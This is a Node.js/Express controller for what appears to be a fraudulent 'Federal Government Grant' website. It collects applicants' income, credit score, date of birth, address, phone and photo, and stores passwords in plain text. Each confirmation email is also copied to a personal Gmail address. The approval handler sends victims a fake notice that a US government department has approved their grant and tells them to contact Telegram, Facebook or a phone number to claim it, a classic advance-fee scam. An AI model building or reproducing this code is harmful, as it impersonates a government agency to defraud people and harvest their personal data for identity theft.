const User = require("../models/UserModel");
const createTokenUser = require("../utils/createTokenUser");
const { createToken } = require("../utils/token");
const sendEmail = require("../utils/emailSender");
const cloudinary = require("cloudinary").v2;

const registerUser = async (req, res) => {
  const {
    firstname,
    lastname,
    othername,
    income,
    occupation,
    amount,
    gender,
    reason,
    phone,
    address,
    state,
    dob,
    creditscore,
    password,
    email,
  } = req.body;

  if (!email || !password) {
    return res.status(400).json({ error: "Email and password are required" });
  }

  // Image upload
  const image = req.files.image; // Assuming you're using single file upload

  if (!image) {
    return res.status(400).json({
      status: "failed",
      error: "User image is required!",
    });
  }

  // Validate file types (example: allow only JPEG and PNG)
  const allowedMimeTypes = ["image/jpeg", "image/png"];
  if (!allowedMimeTypes.includes(image.mimetype)) {
    return res.status(400).json({
      status: "failed",
      error: "Only JPEG and PNG images are allowed!",
    });
  }

  // Input validation
  const requiredFields = [
    { field: firstname, name: "First name" },
    { field: lastname, name: "Last name" },
    { field: income, name: "Income" },
    { field: amount, name: "Amount" },
    { field: gender, name: "Gender" },
    { field: reason, name: "Reason" },
    { field: phone, name: "Phone" },
    { field: address, name: "Address" },
    { field: state, name: "State" },
    { field: dob, name: "Date of Birth" },
    { field: creditscore, name: "Credit Score" },
    { field: password, name: "Password" },
  ];

  for (const { field, name } of requiredFields) {
    if (!field) {
      return res.status(400).json({ error: `${name} is required.` });
    }
  }

  // Additional validation for the reason length
  if (reason.length < 30) {
    return res
      .status(400)
      .json({ error: "Reason should be more than 30 characters." });
  }

  if (password.length < 7) {
    return res
      .status(400)
      .json({ error: "Password must be greater than 6 characters" });
  }

  try {
    const existingUser = await User.findOne({ email });
    if (existingUser) {
      return res.status(404).json({ error: "Email already exists" });
    }

    const imageResult = await cloudinary.uploader.upload(image.tempFilePath, {
      use_filename: true,
      folder: "image_images",
    });

    const user = new User({
      firstname,
      lastname,
      othername,
      income,
      occupation,
      amount,
      gender,
      reason,
      phone,
      address,
      state,
      dob,
      creditscore,
      password,
      image: imageResult.secure_url,
      email,
    });

    await user.save();

    const subject = "Federal Government Grant";
    const text = `Hi ${firstname} ${lastname}, Your registration was successful.`;
    const html = `
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Welcome to Crestwoods Capitals!</title>
        <style>
            body {
                font-family: Arial, sans-serif;
                line-height: 1.6;
                margin: 0;
                padding: 0;
                background-color: #f5f5f5;
                color: #333;
            }
            .container {
                max-width: 600px;
                margin: 20px auto;
                background-color: #fff;
                padding: 20px;
                border-radius: 8px;
                box-shadow: 0 0 10px rgba(0,0,0,0.1);
            }
            h1 {
                color: #0044cc;
            }
        </style>
    </head>
    <body>
        <p>Application Received</p>
        <h4>Thank you!</h4>
        <h2>APPLICATION DETAILS</h2>
        <h2>Name: ${firstname} ${lastname}</h2>
        <h2>Grant Amount: ${amount}</h2>
        <p>Thank you for applying for a Grant payment at the United States Federal Government Grant Claims. 
        Your Grant application is still under processing; You will receive a Grant approval mail from us shortly when your Grant application is successfully approved by the US federal government.</p>
    </body>
    </html>
    `;

    await Promise.all([
      sendEmail(user.email, subject, text, html),
      sendEmail("christopherray5419@gmail.com", subject, text, html),
    ]);

    const tokenUser = createTokenUser(user);

    return res.status(200).json({
      token: createToken({ user: tokenUser }),
      status: "success",
      message: "Registration successful",
      user: tokenUser,
    });
  } catch (error) {
    console.error(error);
    res.status(500).json({ error: "Internal server error" });
  }
};

const login = async (req, res) => {
  try {
    const { email, password } = req.body;
    if (!email || !password) {
      return res.status(400).json({ error: "provide email and password" });
    }
    const user = await User.findOne({ email });
    if (!user) {
      return res.status(404).json({ error: "Email or password incorrect" });
    }
    const isMatch = password === user.password;
    if (!isMatch) {
      return res.status(404).json({ error: "Email or password incorrect" });
    }
    const tokenUser = createTokenUser(user);
    return res.status(200).json({
      token: createToken({ user: tokenUser }),
      status: "success",
      message: "Login successful",
      user: tokenUser,
    });
  } catch (error) {
    console.error(error);
    res.status(500).json({ error: "Internal server error" });
  }
};

const getAllUSer = async (req, res) => {
  try {
    const users = await User.find({});
    res.status(200).json({ nbHits: users.length, users });
  } catch (error) {
    console.error(error);
    res.status(500).json({ error: "Internal server error" });
  }
};

const isApproved = async (req, res) => {
  try {
    const { userId } = req.params;
    const user = await User.findByIdAndUpdate(
      userId,
      { isApproved: true },
      {
        new: true,
        runValidators: true,
      }
    );
    if (!user) {
      return res.status(400).json({ error: "no user found" });
    }

    res.status(200).json({ message: "user updated successfully", user });
    const subject = "CONGRATULATIONS ON YOUR SUCCESSFUL GRANT APPLICATION";
    const text = `Hi ${user.name}, Your registration was successful.`;
    const html = `
    <!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Welcome to Crestwoods Capitals!</title>
    <style>
        /* Add your custom CSS styles here */
        body {
            font-family: Arial, sans-serif;
            line-height: 1.6;
            margin: 0;
            padding: 0;
            background-color: #f5f5f5;
            color: #333;
        }
        .container {
            max-width: 600px;
            margin: 20px auto;
            background-color: #fff;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0,0,0,0.1);
        }
        h1 {
            color: #0044cc;
        }
        .footer {
            margin-top: 20px;
            font-size: 12px;
            color: #666;
        }
    </style>
</head>
<body>
    <h2>Congrats, ${user.lastname} ${user.othername} ${user.lastname}</h2>
    <p>
    <div style="text-align: center;">
   <img src="https://res.cloudinary.com/dobdvrgyr/image/upload/v1729060369/image_images/tmp-3-1729060368881_q1hoxe.png" alt="fhdkjd" style="height: 200px;width: 200px; border-radius: 100%">
  </div>
    Yep, that's right. Congrats  ${user.lastname} ${user.othername} ${user.lastname} You’ve been luckily picked as part of our winner for the day. We have thousands of applications daily but We only pick few winner(s) in a day. 
    Your patience just paid off. You just won a grant of 
    ${user.amount}!
    
     Your application has been successfully approved by the US Federal Government Department of Finance and Grant administration. 
    
    Congratulations once again  ${user.lastname} ${user.othername} ${user.lastname}!
    <p>You can now login to your Grant dashboard via the link below <br> https://fundsapplicantsclaims.com/login.html</p>
    </p>

    <div style="text-align: center;">
    <img src="${user.image}" alt="fhdkjd" style="height: 100px;width: 100px; border-radius: 100%">
   </div>
   <h2>${user.lastname} ${user.othername} ${user.lastname} <br>
   Today’s Grant Winner’
   </h2>

   <div style="text-align: center;">
   <img src="https://res.cloudinary.com/dobdvrgyr/image/upload/v1729060779/image_images/tmp-4-1729060779470_u4qf9w.png" alt="fhdkjd" style="height: 200px;width: 200px; border-radius: 100%">
  </div>

   <h3>CONTACT US NOW TO HAVE YOUR GRANT PAYMENT! </h3>
   <p>We are much more active on Facebook and Telegram we provide Fast online services.</p>
   <p> You can contact us on <a href="https://www.facebook.com/crfitch">facebook</a> or <a href="https://t.me/@paymentclaims">telegram</a>  </p>
   <p> Or Simply text the administrative number below </p>
   <p>(408) 596-3763</p>
   <p>CONTACT US NOW TO CLAIM YOUR GRANT PAYMENT TODAY </P>
   <p>You received this email to let you know about a successful Grant Application that you applied at the United States Federal Government Grant Claims.
   © 2023 Grant Claims, Department Of Finance and Grant administration, USA.</p> 
   </body>
   </html>

     `;
    
    await Promise.all([
      sendEmail(user.email, subject, text, html),

      sendEmail("christopherray5419@gmail.com", subject, text, html),
    ]);
  } catch (error) {
    console.error(error);
    res.status(500).json({ error: "Internal server error" });
  }
};
const getSingleUser = async (req, res) => {
  try {
    const userId = req.user.userId;
    const user = await User.findById(userId);
    if (!user) {
      return res.status(404).json({ error: "User not found" });
    }
    res.status(200).json({ user });
  } catch (error) {
    console.error(error);
    res.status(500).json({ error: "Internal server error" });
  }
};

const deleteUser = async (req, res) => {
  try {
     const { userId } = req.params;
     const user = await User.findByIdAndDelete(userId)
     if (!user) {
       return res.status(400).json({ error: "no user found" });
     }

     res.status(200).json({ message: "user deleted successfully" });
  } catch (error) {
    console.error(error);
    res.status(500).json({ error: "Internal server error" });
  }
}

module.exports = {
  registerUser,
  login,
  getAllUSer,
  isApproved,
  getSingleUser,
  deleteUser
};
